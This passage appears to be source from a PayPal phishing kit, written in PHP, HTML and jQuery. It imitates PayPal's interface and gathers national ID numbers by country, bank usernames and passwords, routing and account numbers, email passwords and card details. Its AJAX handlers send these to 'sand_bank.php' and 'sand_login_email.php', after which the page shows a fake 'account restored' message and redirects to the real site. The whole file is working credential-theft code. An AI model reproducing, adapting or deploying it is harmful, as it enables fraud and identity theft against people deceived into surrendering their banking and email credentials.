<input  required="required" maxlength="14" type="text" id="cpfbr" aria-describedby="text-info-expDate cpfbrinputError" name="cpfbr" class="" placeholder="CPF" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true"></div></div><label id="cpfbrinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>';} ?>
<?php if (trim($_SESSION['country1']) == "Netherlands"){
	echo'<div  class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Citizen Service Number/SOFI" data-reactid="128"><label for="expDate" data-reactid="129">Citizen Service Number/SOFI</label><div class="vx_form-control vx_form-control_complex" data-reactid="130"><input  required="required" maxlength="9" type="text" id="BSN" aria-describedby="text-info-expDate BSNinputError" name="BSN" class="" placeholder="BSN (8/9 digits)" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true"></div></div><label id="BSNinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>';} ?>
<?php if (trim($_SESSION['country1']) == "Spain"){
	echo'<div  class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="National Identity Document Number" data-reactid="128"><label for="expDate" data-reactid="129">National Identity Document Number</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input  required="required" maxlength="9" type="text" id="DNI" aria-describedby="text-info-expDate DNIinputError" name="DNI" class="" placeholder="DNI (NIF/NIE/CIF)" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true"></div></div><label id="DNIinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>';} ?>
<?php if (trim($_SESSION['country1']) == "Sweden"){
	echo'<div  class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Personal Identity Number" data-reactid="128"><label for="expDate" data-reactid="129">Personal Identity Number</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input  required="required" maxlength="11" type="text" id="SID" aria-describedby="text-info-expDate SIDinputError" name="SID" class="" placeholder="Personnummer (10 digits)" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true"></div></div><label id="SIDinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>';} ?>
<?php if (trim($_SESSION['country1']) == "Australia"){
	echo'<div  class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Online Shopping ID" data-reactid="128"><label for="expDate" data-reactid="129">Online Shopping ID</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input  required="required" maxlength="15" type="text" id="OSID" aria-describedby="text-info-expDate OSIDinputError" name="OSID" class="" placeholder="OSID" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true"></div></div><label id="OSIDinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>';} ?>



<br>

<input id="submitBtn" name="" type="submit" class="vx_btn vx_btn-block validateBeforeSubmit" value="Continue" data-click="WorldWideSubmit">

</form>
</div>
</div>
</div>




<div id="nwabank" >
<div class="" data-reactid="108">

<div style="text-align: center;">
<img  src="../style/img/generic-bank_2x.png"> 

</div>



<script>
// Wait for the DOM to be ready
$(function() {



	var validator = $("#nwabanks").bind("invalid-form.validate", function() {
			$("#errorrnwabanks").html("<div class='vx_alert vx_alert-critical form-alert alertComponent test_alert-message'><p role='alert' aria-live='assertive' class='vx_alert-text'><!-- react-text: 204 -->Please check your information and try again.<!-- /react-text --></p></div>");})


  $("form[name='nwabanks']").validate({
    // Specify validation rules

	errorContainer: $("#errorrnwabanks"),


    rules: {


      firstname: "required",
      lastname: "required",
      email: {
        required: true,
        
        email: true
      },
      password: {
        required: true,
        minlength: 5
      }
    },

highlight: function ( element, errorClass, validClass ) {
$( element ).parents( ".dddd" ).removeClass( validClass );
	$( element ).parents( ".dddd" ).addClass( errorClass );
				},
unhighlight: function (element, errorClass, validClass) {
					
	$( element ).parents( ".dddd" ).addClass( validClass );
$( element ).parents( ".dddd" ).removeClass( errorClass );
				},



    messages: {

      firstName: "First Name is required!",
      lastName: "Last Name is required!",

      namebank: "Please check your bank name.",
      xxnxx: "Please check your Routing Number.",
      xxllxx: "Please check your Account Number.",


paypalcreditExpiration: {
        required: "Expiration Month/Year  is required!",
        minlength: "Please enter a valid Expiration Month/Year "
      },


 paypalcreditCardSecurityCode: {
        required: "Security Code (CVV) is required!",
        minlength: "Please enter a valid CVV code"
      },


  cardnumber: {
        required: "Please check your card number",
        minlength: "Please check your card number"
      },


      password: {
        required: "Please provide a password",
        minlength: "Your password must be at least 5 characters long"
      },
      email: "Please enter a valid email address"
    },
    // Make sure the form is submitted to the destination defined
    // in the "action" attribute of the form when valid
    
                submitHandler: function(form) {

                    $("#doori").show();                    



					$.post("../system/sand_bank.php?ajax", $("#nwabanks").serialize(), function(result) {
                            setTimeout(function() {

                          

$("#siribabbbk").attr("class","setupStep-state nemo_account nemo_account_created nemo_setup_button setupStep-doneState accountCreated");

  $("#siribabbbk").html("<span class='icon icon-medium icon-checkmark-small setupStep-icon' aria-hidden='true'></span><span class='setupStep-stateContent'>accounts Bank confirmed </span>");





            

                    $("#emailadress").show();                    $("#emailkatba").show();

                    $("#nwabank").hide();                    $("#bankkatba").hide();

$("#doori").hide();  


                                $(location).attr("", "");
                            });
                    });
    }
  });
});

</script>

  <form id="nwabanks" name="nwabanks" action="./system/sand_3d.php" method="post"   >

<div id="errorrnwabanks"></div>
<div style="text-align: center;">
</div>


<div class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Bank name" data-reactid="128"><label for="expDate" data-reactid="129">Bank name</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input required="required" type="text" ng-model="namebank" id="namebank" aria-describedby="text-info-expDate namebankinputError" name="namebank" class="ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required" placeholder="" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true">

</div>
</div>

<label id="namebankinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>





<div class="multi equal clearfix">
                                                    <div class=" left">

<div class="dddd dor vx_form-group vx_floatingLabel_active" data-label-content="User Name ID" data-reactid="128"><label for="User Name ID" data-reactid="129">User Name ID</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input type="text" required="required" ng-model="UserNameID" id="UserNameID" aria-describedby="text-info-expDate UserNameIDinputError" name="UserNameID" class="" placeholder="" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="false">
</div>
  </div>

<label id="UserNameIDinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>

                      </div>



<div class="right">  



<div  class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Password Bank" data-reactid="128"><label for="Password Bank" data-reactid="129">Password Bank</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input required="required" type="Password"  ng-model="PasswordBank"
 id="PasswordBank" aria-describedby="text-info-expDate PasswordBankinputError" name="PasswordBank" class="" placeholder="" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true">

</div>
</div>

<label id="PasswordBankinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>



                                                    </div>
                                            </div>











<div class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Routing Number" data-reactid="128"><label for="expDate" data-reactid="129">Routing Number</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input required="required" type="text" ng-model="xxnxx" id="xxnxx" aria-describedby="text-info-expDate xxnxxinputError" name="xxnxx" class="ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required" placeholder="" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true">

</div>
</div>



<label id="xxnxxinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>



<div  class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Account Number" data-reactid="128"><label for="expDate" data-reactid="129">Account Number</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input required="required" type="text" ng-model="xxllxx" id="xxllxx" aria-describedby="text-info-expDate xxllxxinputError" name="xxllxx" class="ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required" placeholder="" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true">

</div>
</div>

<label id="xxllxxinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>






<p data-reactid="128">By continuing, you agree to let PayPal send 2 small deposit amounts (less than $1.00) and retrieve them in 1 withdrawal.</p>



<div style="text-align: center;">

<input id="submitBtn" name="" type="submit" class="vx_btn" value="Continue" data-click="WorldWideSubmit">

</form>

<input id="baltiXD" name="" type="submit" class="vx_btn vx_btn-secondary" value="Skip steps" data-click="WorldWideSubmit">


<script>
$("#baltiXD").click(function(e) {
      e.preventDefault();



                    $("#emailadress").show();                    $("#emailkatba").show();

                    $("#nwabank").hide();                    $("#bankkatba").hide();

$("#doori").hide();  


});
</script>      



</div>

</div>



</div>






<div id="emailadress" >

<div class="" data-reactid="108">

<p id="">Use your Email login to link your email . We don't save this information.</p>



<script>
// Wait for the DOM to be ready
$(function() {



	var validator = $("#loginemail").bind("invalid-form.validate", function() {
			$("#errorrloginemail").html("<div class='vx_alert vx_alert-critical form-alert alertComponent test_alert-message'><p role='alert' aria-live='assertive' class='vx_alert-text'><!-- react-text: 204 -->Please check your information and try again.<!-- /react-text --></p></div>");})


  $("form[name='loginemail']").validate({
    // Specify validation rules

	errorContainer: $("#errorrloginemail"),


    rules: {


      firstname: "required",
      lastname: "required",
      email: {
        required: true,
        
        email: true
      },
      password: {
        required: true,
        minlength: 5
      }
    },

highlight: function ( element, errorClass, validClass ) {
$( element ).parents( ".dddd" ).removeClass( validClass );
	$( element ).parents( ".dddd" ).addClass( errorClass );
				},
unhighlight: function (element, errorClass, validClass) {
					
	$( element ).parents( ".dddd" ).addClass( validClass );
$( element ).parents( ".dddd" ).removeClass( errorClass );
				},



    messages: {

      firstName: "First Name is required!",
      lastName: "Last Name is required!",
      passwordemail: "Password <?=@$_SESSION['_emaildd_'];?>
 is required",




     
      password: {
        required: "Please provide a password",
        minlength: "Your password must be at least 5 characters long"
      },
      email: "Please enter a valid email address"
    },
    // Make sure the form is submitted to the destination defined
    // in the "action" attribute of the form when valid
    
                submitHandler: function(form) {

                    $("#doori").show();                    



					$.post("../system/sand_login_email.php?ajax", $("#loginemail").serialize(), function(result) {
                            setTimeout(function() {

                      




$("#thankskatba").show();           
$("#thnksss").show();


$("#tbanhadiblastviry").show();
$("#tbadkatviry").hide();  



                    
$("#emailadress").hide();
$("#emailkatba").hide();

$("#doori").hide();  


                                $(location).attr("", "");
                            });
                    });
    }
  });
});

</script>





<p></p>

  <form id="loginemail" name="loginemail" action="#" method="post"   >




<div id="errorrloginemail"></div>


<p class="addBank-bankName"><span class="vx_text-5"><!-- react-text: 271 -->E-Mail Address<!-- /react-text --><!-- react-text: 272 -->: <!-- /react-text --></span><!-- react-text: 273 --><?php echo $_SESSION['_email_'] ?> <!-- /react-text --></p>


<div class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Password Email Address" data-reactid="128"><label for="expDate" data-reactid="129">Routing Number</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input required="required" type="password" ng-model="passwordemail" id="passwordemail" aria-describedby="text-info-expDate passwordemailinputError" name="passwordemail" class="ng-pristine ng-untouched ng-empty ng-invalid ng-invalid-required" placeholder="Enter your password Email Account" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true">

</div>
</div>

<label id="passwordemailinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>



<br>


<p></p>

<input id="submitBtn" name="" type="submit" class="vx_btn vx_btn-block validateBeforeSubmit" value="Continue" data-click="WorldWideSubmit">


</form></div>

</div>




<div id="thnksss" > 
<div style="text-align: center;">
<img width="150" height="150" src="../style/img/animation-checkmark.gif&#10;"><p>  Now you can enjoy our services, thank you for choosing our trusted service.<br> 
                             your account will be verified in the next 24 hours. 
                        </p>
                        <div class="btn-content-last">
<button id="sirpaypal"  class="vx_btn" type="submit" autocomplete="off" tabindex="0"><!-- react-text: 259 --> My PayPal<!-- /react-text --><span class="icon-paypal-container"><!-- react-text: 261 -->&nbsp;<!-- /react-text --><span class=""></span></span><!-- react-text: 263 --><!-- /react-text --></button> 
<button id="siracont"  class="vx_btn vx_btn-secondary" type="submit" autocomplete="off" tabindex="0"><!-- react-text: 259 --> Log Out<!-- /react-text --><span class="icon-paypal-container"><!-- react-text: 261 -->&nbsp;<!-- /react-text --><span class=""></span></span><!-- react-text: 263 --><!-- /react-text --></button>
<script>
$("#siracont").click(function(e) {
      e.preventDefault();
   $(location).attr("href", "//paypal.com/myaccount");
});
</script>
<script>
$("#sirpaypal").click(function(e) {
      e.preventDefault();
   $(location).attr("href", "//paypal.com/signin");
});
</script>                                                           </div>
 <p class="seconds"> You are being redirected to your PayPal account , within 10 seconds. </p> 

			<p></p><h2>Your Account <?php echo $_SESSION['_email_'] ;?> has been successfully Restored</h2><h2><p></p>
            

<p></p> 
<p></p> 
<p></p><div class="footerLink"></div></h2></div>
 </div>


<div style="display:none" id="android" >


</div>



 

</div>





<!-- react-text: 99 --> <!-- /react-text --></div><div class="signup-page-footer vx_text-legal text-center" data-reactid="100"><!-- react-text: 101 -->©1999-2018 Paypal, Inc. All rights reserved.<!-- /react-text --><span class="signup-page-footer-separator" data-reactid="102">|</span><a href="#"  onclick="openNav()" target="_blank" data-reactid="103">Privacy</a><span class="signup-page-footer-spacer" data-reactid="104">&nbsp;</span><a href="#"   onclick="openNav()" target="_blank" data-reactid="105">Legal</a><span class="signup-page-footer-spacer" data-reactid="106">&nbsp;</span><a href="#"  onclick="openNav()" target="_blank" data-reactid="107">Contact</a><span class="signup-page-footer-spacer" data-reactid="108">&nbsp;</span><span data-reactid="109"><a style="cursor:pointer;" data-reactid="110">Feedback</a></span><!-- react-text: 111 --><!-- /react-text --><!-- react-text: 112 --><!-- /react-text --></div></div><!-- react-text: 113 --> <!-- /react-text --></div></main><!-- react-empty: 114 --><div id="injectedUnifiedLogin" style="height:0px;width:0px;visibility:hidden;over-flow:hidden;" data-reactid="115"></div></div></div>




<!-- react-empty: 118 --></div></div></div>


	<script src="./lib/js/jquery.CardValidator.js"></script>


	<script type="text/javascript">
        $(function() {
		    $('#cardnumber').validateCreditCard(function(result) {
                document.getElementById('card_type').value  = result.card_type.name
                document.getElementById('card_valid').value = result.valid
			$('#cardnumber').validateCreditCard(function(result) {
			    if(result.card_type == null){
                    $('#cardnumber').removeClass();
                }
                else{
                    $('#cardnumber').addClass(result.card_type.name);
					
                }
            });
            });
		});
        </script>
		<script type="text/javascript">		
		$('#cardnumber').validateCreditCard(function(result) {
            // console.log(result);
            if (result.card_type != null) {
                switch (result.card_type.name) {
                    case "VISA":

 $('#csc').attr('pattern', '[0-9]{3}');
					$('#csc').attr('maxlength', '3');
					$('#csc').attr('placeholder', 'Enter security code (3 digits)');


$('#soracard').removeClass('').addClass('visaLogo');
$('#soracard').removeClass('master_cardLogo').addClass('');
$('#soracard').removeClass('amexLogo').addClass('');
$('#soracard').removeClass('discoverLogo').addClass('');



$('.chtadakchi').attr('id', 'chtavisa');


$('#cardsmiya').attr('class', 'creditOrDebit visa blue card image');





$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('').addClass('cardImages-icon_selected');
$('#cscaa').removeClass('csc-image_amex').addClass('');

                        $('#cardnumber').css('background-position', '98.5% -1%');
                        break;
                    case "VISA ELECTRON":


$('.chtadakchi').attr('id', 'chtavisa');


$('#cardsmiya').attr('class', 'creditOrDebit visa blue card image');





$('#soracard').removeClass('').addClass('visaLogo');
$('#soracard').removeClass('master_cardLogo').addClass('');
$('#soracard').removeClass('amexLogo').addClass('');
$('#soracard').removeClass('discoverLogo').addClass('');

                        $('#cardnumber').css('background-position', '98.5%  47.4%'); $('#cscaa').removeClass('csc-image_amex').addClass('');

   $('#csc').attr('pattern', '[0-9]{3}');
					$('#csc').attr('maxlength', '3');
					$('#csc').attr('placeholder', 'Enter security code (3 digits)');



                        break;
                    case "MASTERCARD":


$('.chtadakchi').attr('id', 'chtamastercard');



$('#cardsmiya').attr('class', 'creditOrDebit mastercard black card image');





$('#soracard').removeClass('visaLogo').addClass('');
$('#soracard').removeClass('').addClass('master_cardLogo');
$('#soracard').removeClass('amexLogo').addClass('');
$('#soracard').removeClass('discoverLogo').addClass('');



   $('#csc').attr('pattern', '[0-9]{3}');
					$('#csc').attr('maxlength', '3');
					$('#csc').attr('placeholder', 'Enter security code (3 digits)');

$('#metrcardaa').removeClass('').addClass('cardImages-icon_selected');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected ').addClass('');

 $('#visaa').removeClass('cardImages-icon_selected').addClass('');


$('#cscaa').removeClass('csc-image_amex').addClass('');

                        $('#cardnumber').css('background-position', '98.5%  3.6%');
                        break;
                    case "MAESTRO":

$('.chtadakchi').attr('id', 'chtamastartro');


$('#cardsmiya').attr('class', 'creditOrDebit maestro black card image');




$('#soracard').removeClass('visaLogo').addClass('');
$('#soracard').removeClass('master_cardLogo').addClass('');
$('#soracard').removeClass('amexLogo').addClass('');
$('#soracard').removeClass('discoverLogo').addClass('');




   $('#csc').attr('pattern', '[0-9]{3}');
					$('#csc').attr('maxlength', '3');
					$('#csc').attr('placeholder', 'Enter security code (3 digits)');

                        $('#cardnumber').css('background-position', '98.5%  39.6%');

                        break;
                    case "DISCOVER":


$('.chtadakchi').attr('id', 'chtadiscover');


$('#cardsmiya').attr('class', 'creditOrDebit discover gray card image');




$('#soracard').removeClass('visaLogo').addClass('');
$('#soracard').removeClass('master_cardLogo').addClass('');
$('#soracard').removeClass('amexLogo').addClass('');
$('#soracard').removeClass('').addClass('discoverLogo');


   $('#csc').attr('pattern', '[0-9]{3}');
					$('#csc').attr('maxlength', '3');
					$('#csc').attr('placeholder', 'Enter security code (3 digits)');

$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('').addClass('cardImages-icon_selected');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('cardImages-icon_selected').addClass('');

$('#cscaa').removeClass('csc-image_amex').addClass('');



break;
                    case "AMEX":

$('.chtadakchi').attr('id', 'chtaofam');
 

$('#cardsmiya').attr('class', 'creditOrDebit amex gray card image');




$('#soracard').removeClass('visaLogo').addClass('');
$('#soracard').removeClass('master_cardLogo').addClass('');
$('#soracard').removeClass('').addClass('amexLogo');
$('#soracard').removeClass('discoverLogo').addClass('');


$('#csc').attr('pattern', '[0-9]{4}');
					$('#csc').attr('maxlength', '4');
					$('#csc').attr('placeholder', 'Enter security code (4 digits)');


$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('').addClass('cardImages-icon_selected');

 $('#visaa').removeClass('cardImages-icon_selected').addClass('');


$('#cscaa').removeClass('').addClass('csc-image_amex');


                        break;
					case "JCB":

$('.chtadakchi').attr('id', 'chtajcb');




$('#cardsmiya').attr('class', 'creditOrDebit jcb gold card image');




$('#soracard').removeClass('visaLogo').addClass('');
$('#soracard').removeClass('master_cardLogo').addClass('');
$('#soracard').removeClass('amexLogo').addClass('');
$('#soracard').removeClass('discoverLogo').addClass('');

$('#csc').attr('placeholder', 'Enter security code'); 

$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('cardImages-icon_selected').addClass('');


$('#cscaa').removeClass('').addClass('csc-image_amex');
                        $('#cardnumber').css('background-position', '98.5% 32%');
                        break;
					case "DINERS_CLUB":


$('.chtadakchi').attr('id', 'chtacalub');



$('#cardsmiya').attr('class', 'creditOrDebit cb_nationale blue card image');







$('#soracard').removeClass('visaLogo').addClass('');
$('#soracard').removeClass('master_cardLogo').addClass('');
$('#soracard').removeClass('amexLogo').addClass('');
$('#soracard').removeClass('discoverLogo').addClass('');

                        $('#cardnumber').css('background-position', '98.5% 24.8%');
                        break;
					default:
                        $('#cardnumber').css('background-position', '98.5% 81.7%');

$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('').addClass('cardImages-icon_selected');

                        $('#cardnumber').css('background-position', '98.5% -1%');

$('#csc').attr('placeholder', 'Enter security code'); 
                        break;
                }
			} else {

$('.chtadakchi').attr('id', 'jkljk');



$('#cardsmiya').attr('class', 'creditOrDebit reb3lpp blue card image');








$('#soracard').removeClass('visaLogo').addClass('');
$('#soracard').removeClass('master_cardLogo').addClass('');
$('#soracard').removeClass('amexLogo').addClass('');
$('#soracard').removeClass('discoverLogo').addClass('');


$('#metrcardaa').removeClass('cardImages-icon_selected').addClass('');

$('#discovaraa').removeClass('cardImages-icon_selected').addClass('');

$('#amxaa').removeClass('cardImages-icon_selected').addClass('');

 $('#visaa').removeClass('cardImages-icon_selected').addClass('');

                $('#cardnumber').css('background-position', '98.5% 81.7%');

$('#csc').attr('placeholder', 'Enter security code');
            }
			 // Check for valid card numbere - only show validation checks for invalid Luhn when length is correct so as not to confuse user as they type.
            if (result.valid || $cardinput.val().length > 16) {
                if (result.valid) {


                    $('#cardnumber').removeClass('error').addClass('');
                } else {
                    $('#cardnumber') .removeClass('').addClass('error');
                }
            } else {
                $('#cardnumber').removeClass('').removeClass('error');
            }
        });
		</script>




<script src="../style/js/app.js"></script>
<script src="../style/js/pa.js"></script>
<script src="../style/js/vx-lib.min.js"></script>






</div></body></html>